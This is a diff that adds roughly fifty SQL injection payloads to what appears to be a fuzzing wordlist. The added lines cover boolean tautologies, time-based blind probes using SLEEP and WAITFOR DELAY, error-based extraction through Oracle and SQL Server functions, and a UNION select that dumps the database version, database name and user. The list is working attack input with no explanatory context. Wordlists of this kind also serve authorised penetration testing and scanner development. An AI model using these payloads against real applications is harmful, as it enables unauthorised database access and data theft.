@@ -4,6 +4,60 @@ a' or 1=1--
  or a = a
 a' or 'a' = 'a
 1 or 1=1
+'aNd 1=1
+' anD 1=1"
+' and 1=(select 1)+'
+'+(SELECT 1)+'
+'+(SELECT 999999)+'
+' OR 'sp'='sp
+superbug' AND 'a'='a
+' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;
+' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)
+' or''='
+superbug 'or''='
+' and 1=1
+' and 1=1 'a'='a
+' and 1=1 'a'='a
+' aNd 1=2
+' aNd 1=MID((database()),1,1)>1
+' aNd 2=MID((@@version,1,1)--+
+' aNd 3=MID((@@version,1,1)--+
+' aNd 4=MID((@@version,1,1)--+
+' aNd 5=MID((@@version,1,1)--+
+' or 1=1 --
+a' or 1=1 --
+' or 1=1#
+or 1=1 --
+') or ('x'='x
+or username LIKE '%a%
+' or username LIKE '%a%",
+' HAVING 1=1--
+' and+1=convert(int,@@version)
+' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--"
+'a' || 'b' 
+' SELECT IF(1=1,'true','false')
+') or ('1'='1--
+' GROUP BY 99999
+if(true=false,1,SLEEP(5))--+
+and+if(true%21=true,1,SLEEP(5))--+
+and+if(1=2,1,SLEEP(5))--+
+if(1%21=1,1,SLEEP(5))--+
+if(true=true,1,SLEEP(5))--+
+if(2=2,1,SLEEP(5))--+
+and+true=false--+
+and+false%21=false--+
+and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+
+union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+
+' if(true=false,1,SLEEP(5))--+
+' and+if(true%21=true,1,SLEEP(5))--+
+' and+if(1=2,1,SLEEP(5))--+
+' if(1%21=1,1,SLEEP(5))--+
+' if(true=true,1,SLEEP(5))--+
+' if(2=2,1,SLEEP(5))--+
+' and+true=false--+
+' and+false%21=false--+
+' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+
+' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+
 WAITFOR DELAY '0:0:50';--"
 '+(SELECT 1 FROM (SELECT SLEEP(50))A)+'
 (SELECT 1 FROM (SELECT SLEEP(50))A)
